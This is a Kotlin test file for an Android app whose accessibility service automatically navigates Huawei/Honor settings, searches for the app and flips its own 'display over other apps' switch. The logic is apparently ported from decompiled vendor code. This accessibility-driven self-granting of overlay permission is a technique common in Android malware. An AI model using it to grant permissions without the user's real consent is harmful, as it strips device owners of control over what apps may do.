package com.storm.safe.rock.service.modules.yw5xud.huawei

import com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps
import android.content.Context
import android.content.Intent
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Ignore
import org.junit.Test
import org.junit.runner.RunWith
import org.mockito.ArgumentCaptor
import org.mockito.Mockito.doAnswer
import org.mockito.Mockito.doNothing
import org.mockito.Mockito.mock
import org.mockito.Mockito.spy
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config
import org.mockito.Mockito.`when`

/**
 * HuaweiStep6OverlayTest — TDD coverage for executeStep6OverlayPermission.
 *
 * Vendor: C0365a2.java m212172b9 (L4566-5805).
 * Key logic:
 *  - L4744 canDrawOverlays() → skip if already granted
 *  - L4805 "搜索应用" click via m212160a3
 *  - L4813 OVERLAY_SEARCH_BOX_IDS array (3 viewIds)
 *  - L4830 bundle key "ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE" + appLabel
 *  - L4856 m212157a0(appLabel) = clickAppInOverlayList → success
 *  - L4940 OVERLAY_SWITCH_TEXTS array (6 options)
 *  - outer retry: i28 = 1; i28 < 4 (max 3 attempts)
 */
@Ignore("TODO: adapt to HuaweiSteps split — executeStep6OverlayPermission moved to HuaweiStep6Overlay delegate")
@RunWith(RobolectricTestRunner::class)
@Config(manifest = Config.NONE, sdk = [31])
class HuaweiStep6OverlayTest {

    private lateinit var context: Context
    private lateinit var service: MyAccessibilityService

    @Before
    fun setUp() {
        context = mock(Context::class.java)
        service = mock(MyAccessibilityService::class.java)
        org.mockito.Mockito.`when`(context.packageName).thenReturn("com.test.app")
    }

    // -------------------------------------------------------------------------
    // Test 1 — canDrawOverlays=true → immediate skip
    // -------------------------------------------------------------------------

    @Test
    fun `executeStep6OverlayPermission skips immediately when overlay already granted`() = runBlocking {
        val steps = object : HuaweiSteps(service, context) {
            override fun canDrawOverlaysNow(): Boolean = true
        }
        val successes = mutableListOf<String>()
        val failures = mutableListOf<String>()
        val logs = mutableListOf<String>()

        steps.executeStep6OverlayPermission(successes, failures, logs)

        assertTrue(
            "Should add success entry when overlay already granted",
            successes.any { it.contains("Step6") || it.contains("已有") || it.contains("悬浮窗") }
        )
        assertTrue(
            "Logs should mention skip/already granted",
            logs.any { it.contains("Step6") || it.contains("已有") }
        )
        assertTrue(
            "Failures list should be empty",
            failures.isEmpty()
        )
    }

    // -------------------------------------------------------------------------
    // Test 2 — ACTION_MANAGE_OVERLAY_PERMISSION intent is launched
    // -------------------------------------------------------------------------

    @Test
    fun `executeStep6OverlayPermission launches MANAGE_OVERLAY_PERMISSION intent`() = runBlocking {
        val capturedIntents = mutableListOf<String?>()
        // The implementation uses `service ?: context` as launcher; service is non-null here
        doAnswer { inv ->
            capturedIntents.add((inv.arguments[0] as? Intent)?.action)
            null
        }.`when`(service).startActivity(org.mockito.ArgumentMatchers.any(Intent::class.java))

        val steps = object : HuaweiSteps(service, context) {
            override fun canDrawOverlaysNow(): Boolean = false
            // Make waitForOverlayListLoaded return immediately (timeout=true) to skip further steps
            override suspend fun waitForOverlayListLoaded(timeoutMs: Long): Boolean = true
        }
        val successes = mutableListOf<String>()
        val failures = mutableListOf<String>()
        val logs = mutableListOf<String>()

        steps.executeStep6OverlayPermission(successes, failures, logs)

        assertTrue(
            "Should launch MANAGE_OVERLAY_PERMISSION",
            capturedIntents.any { it == "android.settings.action.MANAGE_OVERLAY_PERMISSION" }
        )
    }

    // -------------------------------------------------------------------------
    // Test 3 — "搜索应用" button is clicked when list IS loaded (vendor L4804-4805)
    // -------------------------------------------------------------------------

    @Test
    fun `executeStep6OverlayPermission clicks search button when list is loaded`() = runBlocking {
        var searchButtonClicked = false
        doNothing().`when`(service).startActivity(org.mockito.ArgumentMatchers.any(Intent::class.java))

        val steps = object : HuaweiSteps(service, context) {
            override fun canDrawOverlaysNow(): Boolean = false
            // false = list IS loaded (vendor inverted bool: false=success)
            override suspend fun waitForOverlayListLoaded(timeoutMs: Long): Boolean = false
            override fun clickSearchButton(): Boolean {
                searchButtonClicked = true
                return true
            }
            // Short-circuit remaining steps
            override fun findAndFocusSearchBox(): AccessibilityNodeInfo? = null
            override suspend fun searchForAppInOverlayList(appLabel: String): Boolean = true
            override fun clickAppInOverlayList(appLabel: String): Boolean = false
            override fun isOnOverlayDetailPageNow(): Boolean = false
            override suspend fun toggleOverlaySwitch(): Boolean = false
        }
        val successes = mutableListOf<String>()
        val failures = mutableListOf<String>()
        val logs = mutableListOf<String>()

        steps.executeStep6OverlayPermission(successes, failures, logs)

        assertTrue(
            "Should click '搜索应用' button when overlay list is loaded (vendor L4805)",
            searchButtonClicked
        )
    }

    // -------------------------------------------------------------------------
    // Test 4 — appLabel is typed into search box (vendor L4830)
    // -------------------------------------------------------------------------

    @Test
    fun `executeStep6OverlayPermission sets appLabel text in search box`() = runBlocking {
        var textSet: String? = null
        val mockSearchBox = mock(AccessibilityNodeInfo::class.java)
        doNothing().`when`(service).startActivity(org.mockito.ArgumentMatchers.any(Intent::class.java))

        val steps = object : HuaweiSteps(service, context) {
            override fun canDrawOverlaysNow(): Boolean = false
            override suspend fun waitForOverlayListLoaded(timeoutMs: Long): Boolean = false
            override fun clickSearchButton(): Boolean = true
            override fun findAndFocusSearchBox(): AccessibilityNodeInfo = mockSearchBox
            override fun setSearchBoxText(node: AccessibilityNodeInfo, text: String) {
                textSet = text
            }
            override suspend fun searchForAppInOverlayList(appLabel: String): Boolean = true
            override fun clickAppInOverlayList(appLabel: String): Boolean = false
            override fun isOnOverlayDetailPageNow(): Boolean = false
            override suspend fun toggleOverlaySwitch(): Boolean = false
        }
        val successes = mutableListOf<String>()
        val failures = mutableListOf<String>()
        val logs = mutableListOf<String>()

        steps.executeStep6OverlayPermission(successes, failures, logs)

        // appLabel is resolved from context; in this mock context it falls back to packageName
        val expectedLabel = steps.appLabel
        assertEquals(
            "Should type appLabel into search box (vendor L4830)",
            expectedLabel,
            textSet
        )
    }

    // -------------------------------------------------------------------------
    // Test 5 — OVERLAY_SEARCH_BOX_IDS contains exactly the 3 vendor viewIds (vendor L4813)
    // -------------------------------------------------------------------------

    @Test
    fun `OVERLAY_SEARCH_BOX_IDS contains all three vendor viewIds`() {
        val ids = HuaweiSteps.OVERLAY_SEARCH_BOX_IDS
        assertTrue(
            "Must contain android:id/search_src_text",
            ids.contains("android:id/search_src_text")
        )
        assertTrue(
            "Must contain com.android.settings:id/search_src_text",
            ids.contains("com.android.settings:id/search_src_text")
        )
        assertTrue(
            "Must contain com.hihonor.settings:id/search_src_text",
            ids.contains("com.hihonor.settings:id/search_src_text")
        )
        assertEquals("Exactly 3 viewIds per vendor L4813", 3, ids.size)
    }

    // -------------------------------------------------------------------------
    // Test 6 — OVERLAY_SWITCH_TEXTS contains all 6 vendor switch text options (vendor L4940)
    // -------------------------------------------------------------------------

    @Test
    fun `OVERLAY_SWITCH_TEXTS contains all six vendor switch text options`() {
        val texts = HuaweiSteps.OVERLAY_SWITCH_TEXTS
        assertTrue("显示在其他应用的上层", texts.contains("显示在其他应用的上层"))
        assertTrue("在其他应用上层显示", texts.contains("在其他应用上层显示"))
        assertTrue("显示在其他应用上层", texts.contains("显示在其他应用上层"))
        assertTrue("允许显示在其他应用的上层", texts.contains("允许显示在其他应用的上层"))
        assertTrue("悬浮窗", texts.contains("悬浮窗"))
        assertTrue("显示悬浮窗", texts.contains("显示悬浮窗"))
        assertEquals("Exactly 6 entries per vendor L4940 strArr2", 6, texts.size)
    }

    // -------------------------------------------------------------------------
    // Test 7 — success: app found, detail page verified, switch toggled
    // -------------------------------------------------------------------------

    @Test
    fun `executeStep6OverlayPermission records success when app clicked and switch toggled`() = runBlocking {
        var overlayGranted = false
        doNothing().`when`(service).startActivity(org.mockito.ArgumentMatchers.any(Intent::class.java))

        val steps = object : HuaweiSteps(service, context) {
            override fun canDrawOverlaysNow(): Boolean = overlayGranted
            override suspend fun waitForOverlayListLoaded(timeoutMs: Long): Boolean = false
            override fun clickSearchButton(): Boolean = true
            override fun findAndFocusSearchBox(): AccessibilityNodeInfo? = null
            override fun setSearchBoxText(node: AccessibilityNodeInfo, text: String) {}
            override suspend fun searchForAppInOverlayList(appLabel: String): Boolean = false
            override fun clickAppInOverlayList(appLabel: String): Boolean = true
            override fun isOnOverlayDetailPageNow(): Boolean = true
            override suspend fun toggleOverlaySwitch(): Boolean {
                overlayGranted = true
                return true
            }
        }
        val successes = mutableListOf<String>()
        val failures = mutableListOf<String>()
        val logs = mutableListOf<String>()

        steps.executeStep6OverlayPermission(successes, failures, logs)

        assertTrue(
            "Should add a success entry after switch toggled",
            successes.any { it.contains("Step6") || it.contains("悬浮窗") }
        )
    }

    // -------------------------------------------------------------------------
    // Test 8 — startActivity exception → failure recorded, no crash
    // -------------------------------------------------------------------------

    @Test
    fun `executeStep6OverlayPermission records failure when startActivity throws`() = runBlocking {
        doAnswer { throw RuntimeException("launch failed") }
            .`when`(service).startActivity(org.mockito.ArgumentMatchers.any(Intent::class.java))

        val steps = object : HuaweiSteps(service, context) {
            override fun canDrawOverlaysNow(): Boolean = false
        }
        val successes = mutableListOf<String>()
        val failures = mutableListOf<String>()
        val logs = mutableListOf<String>()

        steps.executeStep6OverlayPermission(successes, failures, logs)

        // After 3 attempts, each catching the exception — either logged or soft completion
        // Vendor: Exception is caught, loop continues but counter increments; after 3 fails → exits.
        // Our test validates no crash and either a failure or a log entry.
        assertTrue(
            "Logs should contain exception info",
            logs.any { it.contains("Step6") }
        )
        // Verify no uncaught exception (test itself completing is sufficient)
    }

    // -------------------------------------------------------------------------
    // Test 9 — ADAPT: DETAIL page fallback — toggles switch directly (Task 7)
    // -------------------------------------------------------------------------

    @Test
    fun `executeStep6OverlayPermission toggles switch directly when on DETAIL page`() = runBlocking {
        val mockSvc = mock(MyAccessibilityService::class.java)
        val root = mock(AccessibilityNodeInfo::class.java)
        val switchNode = mock(AccessibilityNodeInfo::class.java)
        `when`(mockSvc.rootInActiveWindow).thenReturn(root)
        `when`(switchNode.isVisibleToUser).thenReturn(true)
        `when`(switchNode.className).thenReturn("android.widget.Switch")
        `when`(switchNode.isChecked).thenReturn(false)
        `when`(switchNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)).thenReturn(true)
        // LIST keywords: none match
        `when`(root.findAccessibilityNodeInfosByText("搜索应用")).thenReturn(emptyList())
        `when`(root.findAccessibilityNodeInfosByText("显示在其他应用的上层")).thenReturn(emptyList())
        `when`(root.findAccessibilityNodeInfosByText("Display over other apps")).thenReturn(emptyList())
        `when`(root.findAccessibilityNodeInfosByText("悬浮窗")).thenReturn(emptyList())
        `when`(root.findAccessibilityNodeInfosByText("其他应用之上")).thenReturn(emptyList())
        // DETAIL keyword matches
        `when`(root.findAccessibilityNodeInfosByText("允许显示在其他应用的上层")).thenReturn(listOf(switchNode))

        doNothing().`when`(mockSvc).startActivity(org.mockito.ArgumentMatchers.any(Intent::class.java))

        val steps = object : HuaweiSteps(mockSvc, context) {
            override fun canDrawOverlaysNow(): Boolean = false
            override suspend fun toggleOverlaySwitch(): Boolean = true
        }
        val successes = mutableListOf<String>()
        val failures = mutableListOf<String>()
        val logs = mutableListOf<String>()

        steps.executeStep6OverlayPermission(successes, failures, logs)

        assertTrue(
            "Should detect DETAIL page and record it in logs or successes",
            logs.any { it.contains("DETAIL") } || successes.any { it.contains("悬浮窗") }
        )
    }
}
